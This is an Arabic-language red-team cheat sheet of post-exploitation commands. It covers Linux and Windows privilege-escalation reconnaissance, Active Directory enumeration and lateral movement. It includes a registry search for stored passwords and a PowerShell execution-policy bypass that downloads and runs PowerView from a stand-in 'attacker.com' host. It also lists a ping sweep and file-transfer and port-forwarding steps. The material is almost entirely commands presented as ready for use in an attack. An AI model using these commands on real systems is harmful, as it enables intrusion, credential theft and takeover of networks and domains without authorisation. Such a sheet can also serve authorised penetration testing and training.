1. أوامر الاستكشاف والترقية لنظام Linux (Linux Post-Exploitation)

مذكرة الأوامر الفورية الخاصة بالفريق الأحمر للاستطلاع الداخلي وترقية الامتيازات (Privilege Escalation):

# Check current privileges
id && whoami && uname -a

# Search for SUID files (files running with root authority)
find / -perm -4000 -type f 2>/dev/null

# Check commands permitted with sudo without password
sudo -l

# Check active local ports
netstat -tulpn | grep LISTEN

2. أوامر الاستطلاع والسيطرة لنظام Windows (Windows Post-Exploitation)

أوامر فحص النظام والحماية وتحديد صلاحيات المستخدمين:

# Check system information and hotfixes
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# List enabled privileges of current user
whoami /priv

# Audit service configuration for weak paths (Unquoted Service Paths)
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\" | findstr /i /v "c:\\windows\\"

# Query registry for stored passwords
reg query HKLM /f password /t REG_SZ /s

3. فحص واستغلال الـ Active Directory

أوامر استكشاف النطاق (Domain Recon) والسيطرة على الدومين بالكامل:

# Query current Domain Controller
nltest /dclist:domain_name

# Query list of Domain Admins
net group "Domain Admins" /domain

# PowerShell bypass to run Powerview execution policy
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerView.ps1'); Get-NetUser"

4. أوامر الشبكات والفحص والتنقل الجانبي (Lateral Movement)

كيفية فتح قنوات اتصال خلفية ونقل الملفات واستغلال المنافذ المفتوحة:

# Fast network host discovery using ping sweeping (Linux)
for i in {1..254}; do ping -c 1 192.168.1.$i | grep "from"; done

# Local port forwarding using SSH
ssh -L 8080:localhost:80 target_user@target_ip

# Fast transfer of files over HTTP using Python
python3 -m http.server 80
